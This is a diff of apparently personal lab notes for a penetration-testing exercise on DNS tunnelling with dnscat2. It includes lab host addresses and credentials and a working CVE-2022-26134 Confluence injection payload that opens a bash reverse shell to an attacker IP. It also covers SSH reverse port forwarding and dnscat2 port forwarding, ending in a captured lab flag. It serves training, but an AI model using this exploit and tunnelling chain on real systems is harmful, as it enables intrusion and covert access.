@@ -96,26 +96,11 @@ proxychains4 ./chisel_exercise_client -i 10.4.239.215 -p 8008
 2. Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the binary from **/exercises/dnscat_exercise_client** on CONFLUENCE01. Set up a port forward with dnscat2 which allows you to run **dnscat_exercise_client** against the server running on port 4646 on HRSHARES.
 
 
-
-
-
-
-
-
-
-
-
-
-**EDIT**
-
-
-
-
-
-
-
-
-
+- CONFLUENCE01 - **192.168.227.63**
+- MULTISERVER03 - **192.168.227.64**
+- FELINEAUTHORITY - **192.168.227.7** - kali : 7he_C4t_c0ntro11er
+- PGDATABASE01 - **10.4.227.215** - database_admin : sqlpass123
+- HRSHARES - **172.16.227.217**
 
 
 - Enable the SSH server on Kali & verify SSH port is open
@@ -130,76 +115,125 @@ udo ss -ntplu
 ```
 	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6
 
-
-- Compromise CONFLUENCE01 w/ CVE-2022-26134 & construct remote port forward.
+- Get binary
 ```bash
-curl -v http://192.168.189.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5555%200%3E%261%27%29.start%28%29%22%29%7D/
+wget http://192.168.227.63:8090/exercises/dnscat_exercise_client
+	--2024-06-27 18:10:42--  http://192.168.227.63:8090/exercises/dnscat_exercise_client
+	Connecting to 192.168.227.63:8090... connected.
+	HTTP request sent, awaiting response... 200 
+	Length: 1026416 (1002K)
+	Saving to: ‘dnscat_exercise_client’
+	
+	dnscat_exercise_client  100%[==========================================================================================================>]   1002K  1.38MB/s    in 0.7s    
+	
+	2024-06-27 18:10:43 (1.38 MB/s) - ‘dnscat_exercise_client’ saved [1026416/1026416]
+
+chmod +x dnscat_exercise_client
+```
+
+- Compromise CONFLUENCE01 w/ CVE-2022-26134 & construct local remote port forward.
+```bash
+curl -v http://192.168.227.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5555%200%3E%261%27%29.start%28%29%22%29%7D/
 
 # In revshell
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
-# Set up a dynamic reverse port forward
-ssh -N -R 2345 192.168.45.166
+# Set up a local reverse port forward
+ssh -N -R 127.0..0.1:9999:10.4.227.215:22 kali@192.168.45.166
 ```
 
 - In Kali, ssh into PGDATABASE01 and FELINEAUTHORITY
 ```bash
 # Tab 1 (PGDATABASE01)
-proxychains ssh database_admin@10.4.189.215
-	[proxychains] config file found: /etc/proxychains4.conf
-	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-	[proxychains] DLL init: proxychains-ng 4.17
-	[proxychains] Strict chain  ...  127.0.0.1:2345  ...  10.4.189.215:22  ...  OK
-	The authenticity of host '10.4.189.215 (10.4.189.215)' can''t be established.
-	ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
-	...
-	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-	Warning: Permanently added '10.4.189.215' (ED25519) to the list of known hosts.
-	database_admin@10.4.189.215''s password:
-	...
+ssh database_admin@127.0.0.1 -p 9999
+	database_admin@127.0.0.1''s password: 
+	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
 	database_admin@pgdatabase01:~$
 
 
 # Tab 2 (FELINEAUTHORITY)
-ssh kali@192.168.189.7
-	kali@192.168.189.7''s password: 
+ssh kali@192.168.227.7
+	kali@192.168.227.7''s password: 
 	Linux felineauthority 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64
 	...
 	kali@felineauthority:~$
 ```
 
-- Change config file and simulate a DNS setup on FELINEAUTHORITY
+- Start **dnscat2** server on FELINEAUTHORITY
 ```bash
-cd dns_tunneling
-
-cat dnsmasq.conf
-	# Do not read /etc/resolv.conf or /etc/hosts
-	no-resolv
-	no-hosts
+# kali@felineauthority:~$
+dnscat2-server feline.corp
+	[sudo] password for kali: 
 	
-	# Define the zone
-	auth-zone=feline.corp
-	auth-server=feline.corp
-```
-	- Configuration ignores */etc/resolv.conf* and */etc/hosts*
-	- Only defines the *auth-zone* and *auth-server* variables
-		- Tells dnsmasq to act as the authoritative name server for **feline.corp** zone
-	- Records have not b een configured.
-
-- Start **dnsmasq** using 'no daemon' mode for foreground processing
-```bash
-sudo dnsmasq -C dnsmasq.conf -d
-	[sudo] password for kali: 
-	dnsmasq: started, version 2.89 cachesize 150
-	dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
-	dnsmasq: warning: no upstream servers configured
-	dnsmasq: cleared cache
+	New window created: 0
+	...
+	Of course, you have to figure out <server> yourself! Clients
+	will connect directly on UDP port 53.
 ```
 
-- In a new FELINEAUTHORITY shell, capture DNS packets (UDP/53)
+- Start **dnscat2** client on PGDATABASE01
 ```bash
-sudo tcpdump -i ens192 udp port 53
-	[sudo] password for kali: 
-	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-	listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+# database_admin@pgdatabase01:~/
+cd dnscat/
+
+dnscat$ ./dnscat feline.corp
+	Creating DNS driver:
+	 domain = feline.corp
+	 host   = 0.0.0.0
+	 port   = 53
+	 type   = TXT,CNAME,MX
+	 server = 127.0.0.53
+	
+	Encrypted session established! For added security, please verify the server also displays this string:
+	
+	Tore Lonely Omen Pianos Push Hobble 
+	
+	Session established!
 ```
+
+- Set up **dnscat2** port forward on FELINEAUTHORITY to HRSHARES
+```bash
+	New window created: 1
+	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+	For added security, please ensure the client displays the same string:
+	
+>> 	Tore Lonely Omen Pianos Push Hobble
+
+# dnscat2>
+windows
+	0 :: main [active]
+	  crypto-debug :: Debug window for crypto stuff [*]
+	  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+	  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
+
+
+window -i 1
+	New window created: 1
+	history_size (session) => 1000
+	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+	For added security, please ensure the client displays the same string:
+	
+>> 	Tore Lonely Omen Pianos Push Hobble
+	This is a command session!
+	
+	That means you can enter a dnscat2 command such as
+	'ping'! For a full list of clients, try 'help'.
+
+# command (pgdatabase01) 1>
+listen 0.0.0.0:4646 172.16.227.217:4646
+	Listening on 127.0.0.1:4646, sending connections to 172.16.227.217:4646
+```
+
+- Run binary against FELINEAUTHORITY from attack box
+```bash
+# Kali
+./dnscat_exercise_client -i 192.168.227.7 -p 4646
+	Connecting to 192.168.227.7:4646
+	Flag: "OS{9ca1a6871ac2ca54f4689e69f7210e5d}"
+```
+
+
+### NOTE
+
+>In the context of interface binding, the address 127.0. 0.1 means that the server only listens to the [loopback](Loopback.md) interface.
+>On the other hand, binding our server to the 0.0. 0.0 interface means we want to accept traffic from all of the available interfaces.
